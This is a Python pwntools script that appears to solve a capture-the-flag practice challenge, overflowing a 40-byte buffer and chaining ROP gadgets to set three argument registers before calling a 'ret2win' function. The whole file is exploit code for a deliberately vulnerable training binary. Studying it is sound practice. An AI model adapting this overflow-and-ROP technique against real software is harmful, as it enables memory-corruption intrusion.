#!/usr/bin/env python
from pwn import *

# Arguments
beef = p64(0xdeadbeefdeadbeef)
cafe = p64(0xcafebabecafebabe)
food = p64(0xd00df00dd00df00d)

# Memory location of call to ret2win
call_ret2win = p64(0x40062a)

# Gadgets: Call to __do_global_dtors_aux
arbitrary_call = p64(0x00400680) # ROPgadget didnt find this. I used ghidra to look for calls
big_pop        = p64(0x0040069a) # : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rdi        = p64(0x004006a3) # : pop rdi ; ret

# Overflow
buf = ' '*40 

# Setup the stack
buf += big_pop
buf += p64(1)        # rbx : Loop counter (and pointer offset)
buf += p64(2)        # rbp : Loop counter end.
buf += p64(0x600df0) # r12 : call [r12 + rbx*8]; with our address calls __do_global_dtors_aux
buf += beef          # r13 : arg1 => edi ; note thats EDI, not RDI so we lose 4 bytes
buf += cafe          # r14 : arg2 => rsi
buf += food          # r15 : arg3 => rdx

# Now that the registers have been setup, call our function
buf += arbitrary_call

# When this function returns, it increments ESP and performs numerous pops
buf += "JUNKJUNK"*7

# Put our first argument into RDI
buf += pop_rdi
buf += beef

# Call the function for a win!
buf += call_ret2win

print(buf)
